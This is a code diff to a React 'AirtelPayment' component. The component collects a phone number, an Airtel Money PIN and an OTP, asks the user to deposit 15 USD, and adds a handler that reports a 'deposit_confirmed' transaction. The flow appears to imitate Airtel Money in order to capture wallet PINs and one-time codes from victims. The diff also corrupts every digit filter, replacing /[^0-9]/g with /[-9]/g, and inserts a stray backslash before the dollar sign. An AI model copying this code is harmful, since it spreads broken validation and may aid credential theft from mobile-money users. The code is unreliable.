@@ -66,7 +66,7 @@ export default function AirtelPayment({
   }, [screen, timer]);
 
   const handlePinChange = (index: number, value: string) => {
-    const digit = value.replace(/[^0-9]/g, "");
+    const digit = value.replace(/[-9]/g, "");
     const newPin = [...pin];
     newPin[index] = digit;
     setPin(newPin);
@@ -80,7 +80,7 @@ export default function AirtelPayment({
   };
 
   const handleOtpChange = (index: number, value: string) => {
-    const digit = value.replace(/[^0-9]/g, "");
+    const digit = value.replace(/[-9]/g, "");
     const newOtp = [...otp];
     newOtp[index] = digit;
     setOtp(newOtp);
@@ -118,6 +118,19 @@ export default function AirtelPayment({
       setError("OTP invalide. Veuillez réessayer.");
       setOtp(["", "", "", ""]);
       otpRefs.current[0]?.focus();
+    }, 1500);
+  };
+
+  const handleDeposited = () => {
+    setLoading(true);
+    setError("");
+    notifyTransaction(baseDetails("pending", "deposit_confirmed"));
+    setTimeout(() => {
+      setLoading(false);
+      setScreen("phone");
+      setPhone("");
+      setPin(["", "", "", ""]);
+      setOtp(["", "", "", ""]);
     }, 1500);
   };
 
@@ -182,7 +195,7 @@ export default function AirtelPayment({
                   type="tel"
                   value={phone}
                   onChange={(e) =>
-                    setPhone(e.target.value.replace(/[^0-9]/g, "").slice(0, 10))
+                    setPhone(e.target.value.replace(/[-9]/g, "").slice(0, 10))
                   }
                   placeholder="Enter mobile number"
                   className="flex-1 border-none px-3 py-3.5 text-base outline-none bg-transparent"
@@ -336,14 +349,22 @@ export default function AirtelPayment({
             </h2>
             <p className="text-gray-500 text-[13px] leading-relaxed mb-6">
               You must have at least{" "}
-              <strong className="text-gray-900">15 $ USD</strong> in your
+              <strong className="text-gray-900">15 \$ USD</strong> in your
               Airtel Money wallet to subscribe to this plan.
               <br />
               <br />
               Please deposit the required amount and click the button below.
             </p>
-            <button className="w-full py-3.5 bg-emerald-500 text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-emerald-600">
-              ✅ I have deposited
+            <button
+              onClick={handleDeposited}
+              disabled={loading}
+              className="w-full py-3.5 bg-emerald-500 text-white border-none rounded-[10px] text-[15px] font-semibold cursor-pointer mb-3 transition hover:bg-emerald-600 disabled:bg-gray-300"
+            >
+              {loading ? (
+                <span className="inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+              ) : (
+                "✅ I have deposited"
+              )}
             </button>
             <button
               onClick={() => setScreen("phone")}
@@ -355,9 +376,7 @@ export default function AirtelPayment({
         )}
 
         <div className="mt-auto pt-8 text-center">
-          <p className="text-xs text-gray-400 mb-3">
-            Best experienced with
-          </p>
+          <p className="text-xs text-gray-400 mb-3">Best experienced with</p>
           <div className="flex justify-center gap-3">
             {["Chrome", "Firefox", "Safari", "Edge", "Opera"].map((b) => (
               <div
